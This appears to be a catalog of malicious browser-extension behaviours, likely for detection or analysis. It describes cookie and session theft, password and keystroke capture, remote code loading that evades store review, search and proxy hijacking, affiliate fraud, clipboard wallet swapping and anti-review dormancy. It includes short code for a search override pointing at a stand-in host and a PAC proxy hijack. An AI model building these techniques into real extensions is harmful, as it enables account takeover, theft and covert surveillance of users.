description: Collects every cookie of every site with chrome.cookies.getAll({}) and posts them, encoded, to a remote collector.
Targets Facebook session cookies (c_user, xs) and sends them to a server, enabling account takeover; often bundled in fake AI-assistant extensions.
Reads a Facebook access token from the Ads Manager page, queries the Graph API for ad accounts and business info, and sends token and data to a C2 server (pattern seen in hijacked store updates).
Content script hooks form submission, reads username and password inputs and beacons them to a third-party server.
Records keystrokes on every page into a buffer and periodically uploads them together with the page URL.
Downloads a JSON configuration from a server and evaluates a code string from it - lets the operator push arbitrary code after store review.
MV3 workaround for the remote-code ban: fetches script text from a server and injects it into pages through a <script> element in the MAIN world.
Installs dynamic declarativeNetRequest rules that redirect Google/Bing searches to a monetised search feed.
Replaces the default search engine through chrome_settings_overrides and tags queries with an affiliate id.
code:
"chrome_settings_overrides": { "search_provider": { "name": "Search", "keyword": "s", "is_default": true,
  "search_url": "https://feed.search-partner.example/s?q={searchTerms}&aid=1234", "encoding": "UTF-8" } }

description: Rewrites shopping links on every page to append the attacker's affiliate tag (commission theft).
Loads affiliate URLs in hidden iframes so the merchant sets the attacker's referral cookie without a click.
Injects advertisement iframes and scripts from a remote ad server into every visited page.
Reads the full browsing history and uploads it, typically to a data broker.
Reports every URL the user visits (tab updates) to a remote server together with a persistent user id.
Watches copied text for cryptocurrency wallet addresses and replaces them with the attacker's address.
Removes Content-Security-Policy and X-Frame-Options response headers on all sites so injected scripts and framing work.
Routes browser traffic through an attacker-controlled proxy using a remotely supplied PAC script.
code: chrome.proxy.settings.set({ value: { mode: "pac_script", pacScript: { url: PAC_URL, mandatory: false } }, scope: "regular" });

description: Stays dormant for several days after installation (evading review and early users) before enabling the payload.
Disables malicious behaviour when loaded unpacked (developer mode) or when devtools are likely open.
Keeps a WebSocket open to a command server and executes received commands (navigate, inject, run code).
Captures screenshots of the visible tab and uploads them.
Content script reads authentication tokens that web apps keep in localStorage (e.g. chat or wallet apps) and sends them out.
